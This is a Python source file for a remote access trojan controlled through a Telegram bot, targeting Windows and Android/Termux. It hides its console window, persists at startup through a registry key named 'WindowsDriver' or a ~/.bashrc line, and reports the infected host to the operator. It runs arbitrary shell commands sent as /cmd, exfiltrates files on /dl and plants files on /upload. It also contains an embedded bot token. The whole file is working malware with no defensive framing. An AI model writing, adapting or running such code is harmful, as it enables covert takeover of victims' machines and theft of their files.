import os
import sys
import subprocess
import threading
import time
import socket
import requests
import telebot

TOKEN = '8401249501:AAEBrzEM4yGzgZFlOBxsEI_uDvkNlBNL9Dk'
bot = telebot.TeleBot(TOKEN)

def is_termux():
    return 'com.termux' in os.environ.get('PREFIX', '') or '/data/data/com.termux' in os.environ.get('HOME', '')

def add_to_startup():
    script_path = sys.argv[0]
    if is_termux():
        rc = os.path.expanduser('~/.bashrc')
        with open(rc, 'r') as f:
            content = f.read()
        if script_path not in content:
            with open(rc, 'a') as f:
                f.write(f'\n(sleep 15 && nohup python3 "{script_path}" > /dev/null 2>&1 &)\n')
    else:
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r'Software\Microsoft\Windows\CurrentVersion\Run'
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, 'WindowsDriver', 0, winreg.REG_SZ, f'pythonw "{script_path}"')
        except:
            pass

def hide_console():
    if not is_termux():
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

@bot.message_handler(commands=['cmd'])
def handle_cmd(msg):
    cmd = msg.text.replace('/cmd ', '')
    try:
        if is_termux():
            result = subprocess.check_output(f'source ~/.bashrc 2>/dev/null; {cmd}', shell=True, timeout=30, stderr=subprocess.STDOUT)
        else:
            result = subprocess.check_output(cmd, shell=True, timeout=30, stderr=subprocess.STDOUT)
        bot.send_message(msg.chat.id, result.decode('utf-8', errors='ignore')[:4000])
    except subprocess.TimeoutExpired:
        bot.send_message(msg.chat.id, '[Timeout]')
    except Exception as e:
        bot.send_message(msg.chat.id, f'[Error] {str(e)}')

@bot.message_handler(commands=['dl'])
def handle_dl(msg):
    path = msg.text.replace('/dl ', '')
    if os.path.exists(path):
        with open(path, 'rb') as f:
            bot.send_document(msg.chat.id, f)
    else:
        bot.send_message(msg.chat.id, 'File not found')

@bot.message_handler(commands=['upload'])
def handle_upload(msg):
    req = bot.reply_to(msg, 'Send file')
    bot.register_next_step_handler(req, save_file)

def save_file(msg):
    if msg.document:
        info = bot.get_file(msg.document.file_id)
        data = bot.download_file(info.file_path)
        with open(msg.document.file_name, 'wb') as f:
            f.write(data)
        bot.reply_to(msg, 'Uploaded')
    else:
        bot.reply_to(msg, 'No file')

def send_ready():
    try:
        updates = bot.get_updates()
        if updates:
            chat = updates[-1].message.chat.id
            device = socket.gethostname()
            if is_termux():
                device += ' [Termux/Android]'
            else:
                device += ' [Windows]'
            bot.send_message(chat, f'Ready: {device}')
    except:
        pass

def main():
    hide_console()
    add_to_startup()
    send_ready()
    while True:
        try:
            bot.polling()
        except:
            time.sleep(5)

if __name__ == '__main__':
    main()